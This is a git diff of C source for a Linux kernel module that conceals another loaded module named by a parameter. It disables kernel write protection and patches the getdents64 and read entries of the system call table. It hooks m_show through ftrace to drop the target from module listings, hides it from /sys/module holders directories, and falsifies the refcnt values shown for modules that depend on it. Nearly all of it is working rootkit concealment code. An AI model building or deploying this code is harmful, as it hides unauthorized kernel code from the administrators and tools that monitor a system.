@@ -14,27 +14,29 @@ void m_show_callback_func(unsigned long ip, unsigned long parent_ip, struct ftra
 void module_refcount_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
 
 // Types & other consts.
-static char *module_to_hide;
-module_param(module_to_hide, charp, 0);
+static char *mod_name_to_hide;
+module_param(mod_name_to_hide, charp, 0);
+
+static unsigned long *syscall_table; 
+static char *sys_modules_path = "/sys/module/";
+static char *module_name = "LsModIntercept";
+
 
 // get_dents64 hook
 typedef int (*original_getdents64_t)(const struct pt_regs *regs);
 static original_getdents64_t original_getdents64_ptr;
-static unsigned long *syscall_table; 
-static char *first_half_holders_path = "/sys/module/";
-static char *second_half_holders_path = "/holders";
+static char *holders_path = "/holders";
+
+// read hook
+typedef ssize_t  (*original_read_t)(const struct pt_regs *regs);
+static original_read_t original_read_ptr;
+static char *refcount_path = "/refcnt";
 
 // m_show hook
 typedef int (*original_m_show_t)(struct seq_file *seq, void *v);
 static unsigned long m_show_address; 
 static original_m_show_t original_m_show_ptr;
 static struct ftrace_ops m_show_ops = { .func = m_show_callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY };
-
-// module_refcount hook
-typedef unsigned int (*original_module_refcount_t)(struct module *mod);
-static unsigned long module_refcount_address; 
-static original_module_refcount_t original_module_refcount_ptr;
-static struct ftrace_ops module_refcount_ops = { .func = module_refcount_callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY };
 
 static inline void wp_cr0(unsigned long val) {
     __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
@@ -49,23 +51,69 @@ static inline void one_cr0(void) {
     wp_cr0(read_cr0() | 0x10000);
 }
 
-bool is_equal(int fd, char *curr_file_name) {
-    struct file *file = fget(fd);
-    if (!file) {
-        printk(KERN_ALERT "Couldnt find file with fd: %d", fd);
-        return false;
-    }
-
+char* get_file_path_from_file_struct(struct file *file) {
     char *path;
     path = kmalloc(PATH_MAX, GFP_KERNEL);
     path = d_path(&file->f_path, path, PATH_MAX);
 
-    if ((strstr(path, first_half_holders_path) != NULL) && (strstr(path, second_half_holders_path) != NULL) && (!strcmp(curr_file_name, module_to_hide))) {
-        printk(KERN_ALERT "Hiding %s from %s", module_to_hide, path);
-        return true;
+    return path;
+}
+
+/* Does a already use b?
+   Copied from module.c, as that function is not exported. */
+int already_uses(struct module *a, struct module *b)
+{
+	struct module_use *use;
+
+	list_for_each_entry(use, &b->source_list, source_list) {
+		if (use->source == a) {
+			return 1;
+		}
+	}
+    
+	return 0;
+}
+
+ssize_t new_read(const struct pt_regs *regs) {
+    int bytes_read = original_read_ptr(regs);
+    struct file *file = fget((int)regs->di);
+    if (file == NULL) {
+        return bytes_read;
     }
 
-    return false;
+    char *path = get_file_path_from_file_struct(file);
+        
+    if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, refcount_path) != NULL) && bytes_read > 0) {
+        char *current_module_name = file->f_path.dentry->d_parent->d_iname;
+        if (!strcmp(mod_name_to_hide, current_module_name)) {
+            return bytes_read;
+        }
+
+        mutex_lock(&module_mutex);
+        struct module *module_to_hide = find_module(mod_name_to_hide);
+        struct module *current_module = find_module(current_module_name);
+        mutex_unlock(&module_mutex);
+
+        int does_use_hidden_module = already_uses(module_to_hide, current_module);
+        if (does_use_hidden_module) {
+            printk("Removing from used by...");
+
+            int refcount = module_refcount(current_module);
+            if (refcount > 0) {
+                int new_refcount = refcount - 1;
+
+                void *buf_pointer = (void*)regs->si;
+                char *new_value = kmalloc(bytes_read, GFP_KERNEL);
+                sprintf(new_value, "%d\n", new_refcount);
+                copy_to_user(buf_pointer, new_value, bytes_read);
+
+                return bytes_read;       
+            }
+        }
+        
+    }
+
+    return bytes_read;
 }
 
 int new_getdents64(const struct pt_regs *regs) {
@@ -90,7 +138,10 @@ int new_getdents64(const struct pt_regs *regs) {
         while ((i < total_bytes_read) && (curr->d_reclen > 0)) {   
             curr = first + i;
 
-            if (is_equal((int)regs->di, curr->d_name)) {
+            struct file *file = fget((int)regs->di);
+            char *path = get_file_path_from_file_struct(file);
+            if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, holders_path) != NULL) && (!strcmp(curr->d_name, mod_name_to_hide))) {
+                printk(KERN_ALERT "Hiding %s from %s", mod_name_to_hide, path);    
                 has_been_found = true;
                 int length_to_copy = total_bytes_read - i - curr->d_reclen;
 
@@ -115,24 +166,12 @@ int new_getdents64(const struct pt_regs *regs) {
 
 int new_m_show(struct seq_file *m, void *p) {
     struct module *mod = list_entry(p, struct module, list);
-    if (!strcmp(mod->name, module_to_hide)) {
+    if (!strcmp(mod->name, mod_name_to_hide)) {
         printk(KERN_ALERT "Hiding %s", mod->name);
         return 0;
     }
 
     return original_m_show_ptr(m, p);
-}
-
-unsigned int new_module_refcount(struct module *mod) {
-    printk("HOOKED!");
-    return original_module_refcount_ptr(mod);
-}
-
-void notrace module_refcount_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
-    // To prevent an infinite loop.
-    if (!within_module(parent_ip, THIS_MODULE)) {
-        regs->ip = (long unsigned int)new_module_refcount;
-    }
 }
 
 void notrace m_show_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
@@ -143,6 +182,11 @@ void notrace m_show_callback_func(unsigned long ip, unsigned long parent_ip, str
 }
  
 int load(void) {
+    if (mod_name_to_hide == NULL) {
+        printk("Mod name to hide has not been set! Exiting...");
+        return -1;
+    }
+
     printk(KERN_ALERT "Initializing...");
     m_show_address = kallsyms_lookup_name("m_show");
     if (!m_show_address) {
@@ -154,21 +198,15 @@ int load(void) {
     ftrace_set_filter_ip(&m_show_ops, (unsigned long)original_m_show_ptr, 0, 0);
     register_ftrace_function(&m_show_ops);
 
-    module_refcount_address = kallsyms_lookup_name("module_refcount");
-    if (!module_refcount_address) {
-        printk(KERN_ALERT "Failed to find module_refcount!");            
-        return 0;
-    }
-    printk(KERN_ALERT "module_refcount found %lu", module_refcount_address);
-    original_module_refcount_ptr = (original_module_refcount_t)module_refcount_address;
-    ftrace_set_filter_ip(&module_refcount_ops, (unsigned long)original_module_refcount_ptr, 0, 0);
-    register_ftrace_function(&module_refcount_ops);
-
     zero_cr0();
     syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
     original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
     syscall_table[__NR_getdents64] = (unsigned long)new_getdents64;
     printk(KERN_ALERT "Overrided getdents64 ptr!");
+
+    original_read_ptr = (original_read_t)syscall_table[__NR_read];
+    syscall_table[__NR_read] = (unsigned long)new_read;
+    printk(KERN_ALERT "Overrided read ptr!");
     one_cr0();
     printk(KERN_ALERT "Initialized successfuly!");
 
@@ -178,11 +216,13 @@ int load(void) {
 void unload(void) {
     printk(KERN_ALERT "Shutting down.");
     unregister_ftrace_function(&m_show_ops);
-    unregister_ftrace_function(&module_refcount_ops);
 
     zero_cr0();
     syscall_table[__NR_getdents64] = (unsigned long)original_getdents64_ptr;  
     printk(KERN_ALERT "getdents64 has been restored!");
+
+    syscall_table[__NR_read] = (unsigned long)original_read_ptr;
+    printk(KERN_ALERT "read has been restored!");
     one_cr0();
     printk(KERN_ALERT "Goodbye world...");
 }
